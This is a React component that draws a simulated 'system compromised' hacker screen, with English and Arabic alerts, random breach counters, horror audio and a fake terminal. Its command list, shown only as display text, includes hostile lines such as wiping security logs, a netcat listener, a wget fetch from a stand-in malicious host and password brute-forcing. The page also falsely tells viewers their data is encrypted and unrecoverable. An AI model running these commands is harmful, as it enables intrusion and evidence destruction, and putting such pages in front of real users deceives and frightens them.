import React, { useState, useEffect, useRef } from 'react';

const App: React.FC = () => {
  const [breachProgress, setBreachProgress] = useState(0);
  const [currentThreat, setCurrentThreat] = useState('');
  const [systemsCompromised, setSystemsCompromised] = useState(0);
  const [dataExfiltrated, setDataExfiltrated] = useState(0);
  const [timeElapsed, setTimeElapsed] = useState(0);
  const [currentCommand, setCurrentCommand] = useState('');
  const [alertLevel, setAlertLevel] = useState(1);
  const audioRef = useRef<HTMLAudioElement>(null);

  useEffect(() => {
    const mainTimer = setInterval(() => {
      setBreachProgress(prev => Math.min(prev + Math.random() * 1.5, 100));
      setSystemsCompromised(prev => Math.min(prev + Math.floor(Math.random() * 2), 47));
      setDataExfiltrated(prev => prev + Math.floor(Math.random() * 2500));
      setTimeElapsed(prev => prev + 1);
      setAlertLevel(prev => Math.min(prev + 0.1, 5));
    }, 1200);

    const threatTimer = setInterval(() => {
      const threats = [
        'تحذير: اختراق قاعدة البيانات الرئيسية',
        'WARNING: ROOT ACCESS COMPROMISED',
        'خرق أمني: سرقة بيانات المستخدمين',
        'CRITICAL: FIREWALL BYPASSED',
        'تنبيه: تشفير الملفات جاري',
        'ALERT: RANSOMWARE DEPLOYMENT DETECTED',
        'خطر: تسريب كلمات المرور',
        'BREACH: ADMIN CREDENTIALS STOLEN',
        'تحذير عاجل: النظام تحت السيطرة الكاملة',
        'EMERGENCY: TOTAL SYSTEM TAKEOVER'
      ];
      setCurrentThreat(threats[Math.floor(Math.random() * threats.length)]);
    }, 2500);

    const commandTimer = setInterval(() => {
      const commands = [
        'sudo rm -rf /var/log/security/*',
        'nc -lvp 4444 &',
        'python3 keylogger.py --stealth',
        'wget http://malicious-server.com/payload.sh',
        'chmod +x backdoor && ./backdoor',
        'nmap -sS -O target_network/24',
        'hydra -l admin -P passwords.txt ssh://target',
        'sqlmap -u "target.com" --dump',
        'msfconsole -r exploit.rc',
        'john --wordlist=rockyou.txt hashes.txt'
      ];
      setCurrentCommand(commands[Math.floor(Math.random() * commands.length)]);
    }, 3000);

    const playAudio = () => {
      const audioFiles = [
        '/scary-ambience-59002.mp3',
        '/horror_scream.wav',
        '/evil_beep.wav'
      ];
      
      const randomAudio = audioFiles[Math.floor(Math.random() * audioFiles.length)];
      if (audioRef.current) {
        audioRef.current.src = randomAudio;
        audioRef.current.currentTime = 0;
        audioRef.current.play().catch(console.error);
        
        setTimeout(() => {
          if (audioRef.current) {
            audioRef.current.pause();
          }
        }, 20000);
      }
    };

    const audioInterval = setInterval(playAudio, 25000);
    playAudio();

    return () => {
      clearInterval(mainTimer);
      clearInterval(threatTimer);
      clearInterval(commandTimer);
      clearInterval(audioInterval);
    };
  }, []);

  const formatTime = (seconds: number) => {
    const hours = Math.floor(seconds / 3600);
    const mins = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${hours.toString().padStart(2, '0')}:${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  return (
    <div style={{
      minHeight: '100vh',
      background: `
        radial-gradient(circle at 20% 80%, #ff0000 0%, transparent 50%),
        radial-gradient(circle at 80% 20%, #00ff00 0%, transparent 50%),
        radial-gradient(circle at 40% 40%, #0000ff 0%, transparent 50%),
        linear-gradient(135deg, #000000, #1a0000, #000a00, #00001a, #000000)
      `,
      backgroundSize: '300% 300%',
      animation: 'chaosGradient 6s ease infinite',
      color: '#00ff41',
      fontFamily: '"Courier New", "Lucida Console", monospace',
      overflow: 'hidden',
      position: 'relative'
    }}>
      <audio ref={audioRef} />
      
      {/* Scanning Lines Effect */}
      <div style={{
        position: 'absolute',
        top: 0,
        left: 0,
        width: '100%',
        height: '100%',
        background: `
          repeating-linear-gradient(
            0deg,
            transparent,
            transparent 2px,
            rgba(0, 255, 65, 0.1) 2px,
            rgba(0, 255, 65, 0.1) 4px
          )
        `,
        animation: 'scanLines 0.1s linear infinite'
      }} />

      {/* Digital Noise */}
      <div style={{
        position: 'absolute',
        top: 0,
        left: 0,
        width: '100%',
        height: '100%',
        background: `
          repeating-conic-gradient(
            from 0deg at 50% 50%,
            transparent 0deg,
            rgba(255, 0, 0, 0.05) 1deg,
            transparent 2deg
          )
        `,
        animation: 'digitalNoise 0.2s infinite'
      }} />

      {/* Breach Alert Banner */}
      <div style={{
        position: 'fixed',
        top: 0,
        left: 0,
        width: '100%',
        backgroundColor: alertLevel > 3 ? '#ff0000' : '#ff4500',
        color: '#ffffff',
        padding: '15px',
        textAlign: 'center',
        fontSize: '1.2rem',
        fontWeight: 'bold',
        zIndex: 1000,
        animation: alertLevel > 4 ? 'criticalFlash 0.3s infinite' : 'warningPulse 2s infinite',
        borderBottom: '3px solid #ffffff',
        boxShadow: '0 0 20px rgba(255, 0, 0, 0.8)'
      }}>
        🚨 SECURITY BREACH DETECTED - خرق أمني مكتشف 🚨
        <br />
        <span style={{ fontSize: '0.9rem' }}>
          {currentThreat || 'النظام تحت الهجوم - SYSTEM UNDER ATTACK'}
        </span>
      </div>

      <div style={{
        padding: '80px 20px 20px 20px',
        position: 'relative',
        zIndex: 10
      }}>
        {/* Main Header */}
        <div style={{
          textAlign: 'center',
          marginBottom: '30px',
          border: `3px solid ${alertLevel > 4 ? '#ff0000' : '#ff4500'}`,
          padding: '25px',
          backgroundColor: 'rgba(0, 0, 0, 0.9)',
          borderRadius: '10px',
          boxShadow: `0 0 30px ${alertLevel > 4 ? 'rgba(255, 0, 0, 0.6)' : 'rgba(255, 69, 0, 0.6)'}`,
          animation: 'headerGlow 3s ease infinite'
        }}>
          <h1 style={{
            fontSize: '2.8rem',
            color: '#ff0000',
            textShadow: '0 0 25px #ff0000, 0 0 50px #ff0000',
            margin: '0 0 15px 0',
            animation: 'textGlitch 1.5s infinite',
            letterSpacing: '2px'
          }}>
            ⚠️ SYSTEM COMPROMISED ⚠️
          </h1>
          <h2 style={{
            fontSize: '2rem',
            color: '#ff4500',
            margin: '10px 0',
            animation: 'arabicFlicker 2s infinite'
          }}>
            تم اختراق النظام بالكامل
          </h2>
          <div style={{
            fontSize: '1.3rem',
            color: '#00ff41',
            margin: '15px 0',
            animation: 'typewriterEffect 4s steps(50) infinite'
          }}>
            UNAUTHORIZED ACCESS GRANTED - وصول غير مصرح به
          </div>
        </div>

        {/* Status Grid */}
        <div style={{
          display: 'grid',
          gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))',
          gap: '20px',
          marginBottom: '30px'
        }}>
          {/* Breach Progress */}
          <div style={{
            backgroundColor: 'rgba(255, 0, 0, 0.15)',
            border: '2px solid #ff0000',
            borderRadius: '8px',
            padding: '20px',
            animation: 'cardPulse 2s infinite'
          }}>
            <h3 style={{
              color: '#ff0000',
              fontSize: '1.4rem',
              margin: '0 0 15px 0',
              textAlign: 'center'
            }}>
              🔓 تقدم الاختراق
            </h3>
            <div style={{
              fontSize: '2.5rem',
              color: '#ff4500',
              textAlign: 'center',
              fontWeight: 'bold'
            }}>
              {breachProgress.toFixed(1)}%
            </div>
            <div style={{
              backgroundColor: '#000000',
              height: '15px',
              borderRadius: '7px',
              overflow: 'hidden',
              marginTop: '10px'
            }}>
              <div style={{
                width: `${breachProgress}%`,
                height: '100%',
                background: 'linear-gradient(90deg, #ff0000, #ff4500, #ff0000)',
                animation: 'progressGlow 1s infinite'
              }} />
            </div>
          </div>

          {/* Systems Compromised */}
          <div style={{
            backgroundColor: 'rgba(255, 69, 0, 0.15)',
            border: '2px solid #ff4500',
            borderRadius: '8px',
            padding: '20px',
            animation: 'cardPulse 2.2s infinite'
          }}>
            <h3 style={{
              color: '#ff4500',
              fontSize: '1.4rem',
              margin: '0 0 15px 0',
              textAlign: 'center'
            }}>
              💻 الأنظمة المخترقة
            </h3>
            <div style={{
              fontSize: '2.5rem',
              color: '#ff0000',
              textAlign: 'center',
              fontWeight: 'bold'
            }}>
              {systemsCompromised}/47
            </div>
            <div style={{
              color: '#00ff41',
              textAlign: 'center',
              marginTop: '5px'
            }}>
              Systems Breached
            </div>
          </div>

          {/* Data Exfiltrated */}
          <div style={{
            backgroundColor: 'rgba(0, 255, 65, 0.15)',
            border: '2px solid #00ff41',
            borderRadius: '8px',
            padding: '20px',
            animation: 'cardPulse 2.4s infinite'
          }}>
            <h3 style={{
              color: '#00ff41',
              fontSize: '1.4rem',
              margin: '0 0 15px 0',
              textAlign: 'center'
            }}>
              📊 البيانات المسروقة
            </h3>
            <div style={{
              fontSize: '2.5rem',
              color: '#ff4500',
              textAlign: 'center',
              fontWeight: 'bold'
            }}>
              {(dataExfiltrated / 1024).toFixed(1)} GB
            </div>
            <div style={{
              color: '#ff0000',
              textAlign: 'center',
              marginTop: '5px'
            }}>
              Data Stolen
            </div>
          </div>

          {/* Time Elapsed */}
          <div style={{
            backgroundColor: 'rgba(138, 43, 226, 0.15)',
            border: '2px solid #8a2be2',
            borderRadius: '8px',
            padding: '20px',
            animation: 'cardPulse 2.6s infinite'
          }}>
            <h3 style={{
              color: '#8a2be2',
              fontSize: '1.4rem',
              margin: '0 0 15px 0',
              textAlign: 'center'
            }}>
              ⏱️ مدة الاختراق
            </h3>
            <div style={{
              fontSize: '2.5rem',
              color: '#ff0000',
              textAlign: 'center',
              fontWeight: 'bold'
            }}>
              {formatTime(timeElapsed)}
            </div>
            <div style={{
              color: '#00ff41',
              textAlign: 'center',
              marginTop: '5px'
            }}>
              Breach Duration
            </div>
          </div>
        </div>

        {/* Hacker Terminal */}
        <div style={{
          backgroundColor: 'rgba(0, 0, 0, 0.95)',
          border: '2px solid #00ff41',
          borderRadius: '10px',
          padding: '20px',
          marginBottom: '30px',
          fontFamily: '"Courier New", monospace',
          boxShadow: '0 0 20px rgba(0, 255, 65, 0.5)'
        }}>
          <div style={{
            color: '#00ff41',
            fontSize: '1.3rem',
            marginBottom: '15px',
            textAlign: 'center',
            borderBottom: '1px solid #00ff41',
            paddingBottom: '10px'
          }}>
            💻 ACTIVE BREACH TERMINAL - طرفية الاختراق النشطة
          </div>
          <div style={{
            color: '#00ff41',
            fontSize: '1rem',
            lineHeight: '1.6'
          }}>
            <div>root@compromised-system:~# {currentCommand}</div>
            <div style={{ color: '#ff4500' }}>└─ Executing malicious payload...</div>
            <div style={{ color: '#ff0000' }}>└─ Bypassing security protocols... SUCCESS</div>
            <div style={{ color: '#00ff41' }}>└─ Establishing persistent backdoor... COMPLETE</div>
            <div style={{ color: '#8a2be2' }}>└─ Exfiltrating sensitive data... IN PROGRESS</div>
            <div style={{ color: '#ff0000' }}>└─ النظام تحت السيطرة الكاملة - TOTAL CONTROL ACHIEVED</div>
          </div>
        </div>

        {/* Critical Alert */}
        <div style={{
          backgroundColor: 'rgba(255, 0, 0, 0.2)',
          border: '3px solid #ff0000',
          borderRadius: '10px',
          padding: '25px',
          textAlign: 'center',
          animation: 'criticalAlert 1s infinite',
          marginBottom: '30px'
        }}>
          <h2 style={{
            color: '#ff0000',
            fontSize: '2rem',
            margin: '0 0 15px 0',
            animation: 'emergencyFlash 0.5s infinite'
          }}>
            ☠️ CRITICAL SYSTEM FAILURE ☠️
          </h2>
          <div style={{
            fontSize: '1.4rem',
            color: '#ffffff',
            margin: '10px 0'
          }}>
            🚨 جميع البيانات الحساسة تم تشفيرها
          </div>
          <div style={{
            fontSize: '1.4rem',
            color: '#ffffff',
            margin: '10px 0'
          }}>
            🚨 ALL SENSITIVE DATA ENCRYPTED
          </div>
          <div style={{
            fontSize: '1.2rem',
            color: '#ff4500',
            margin: '15px 0'
          }}>
            💀 RECOVERY IMPOSSIBLE - الاسترداد مستحيل 💀
          </div>
        </div>

        {/* Footer */}
        <div style={{
          textAlign: 'center',
          padding: '20px',
          backgroundColor: 'rgba(0, 0, 0, 0.8)',
          border: '1px solid #ff0000',
          borderRadius: '5px',
          animation: 'footerGlow 4s infinite'
        }}>
          <div style={{
            color: '#ff0000',
            fontSize: '1.3rem',
            marginBottom: '10px'
          }}>
            ⚠️ النظام مغلق نهائياً بسبب الاختراق الأمني ⚠️
          </div>
          <div style={{
            color: '#ff4500',
            fontSize: '1.3rem',
            marginBottom: '15px'
          }}>
            SYSTEM PERMANENTLY CLOSED DUE TO SECURITY BREACH
          </div>
          <div style={{
            color: '#00ff41',
            fontSize: '1rem',
            animation: 'developerCredit 3s infinite'
          }}>
            تم تطوير النظام بواسطة Boon
          </div>
        </div>
      </div>

      <style>{`
        @keyframes chaosGradient {
          0%, 100% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
        }
        
        @keyframes scanLines {
          0% { transform: translateY(-100%); }
          100% { transform: translateY(100vh); }
        }
        
        @keyframes digitalNoise {
          0%, 100% { opacity: 0.1; }
          50% { opacity: 0.3; }
        }
        
        @keyframes criticalFlash {
          0%, 100% { background-color: #ff0000; }
          50% { background-color: #ff4500; }
        }
        
        @keyframes warningPulse {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.7; }
        }
        
        @keyframes headerGlow {
          0%, 100% { box-shadow: 0 0 30px rgba(255, 69, 0, 0.6); }
          50% { box-shadow: 0 0 50px rgba(255, 0, 0, 0.8); }
        }
        
        @keyframes textGlitch {
          0%, 90%, 100% { transform: translate(0); }
          20% { transform: translate(-2px, 2px); }
          40% { transform: translate(-2px, -2px); }
          60% { transform: translate(2px, 2px); }
          80% { transform: translate(2px, -2px); }
        }
        
        @keyframes arabicFlicker {
          0%, 100% { opacity: 1; }
          25% { opacity: 0.8; }
          50% { opacity: 0.9; }
          75% { opacity: 0.7; }
        }
        
        @keyframes typewriterEffect {
          0%, 100% { width: 0; }
          50% { width: 100%; }
        }
        
        @keyframes cardPulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.02); }
        }
        
        @keyframes progressGlow {
          0%, 100% { box-shadow: 0 0 10px rgba(255, 0, 0, 0.5); }
          50% { box-shadow: 0 0 20px rgba(255, 69, 0, 0.8); }
        }
        
        @keyframes criticalAlert {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.01); }
        }
        
        @keyframes emergencyFlash {
          0%, 100% { color: #ff0000; }
          50% { color: #ffffff; }
        }
        
        @keyframes footerGlow {
          0%, 100% { border-color: #ff0000; }
          33% { border-color: #ff4500; }
          66% { border-color: #00ff41; }
        }
        
        @keyframes developerCredit {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.8; }
        }
      `}</style>
    </div>
  );
};

export default App;
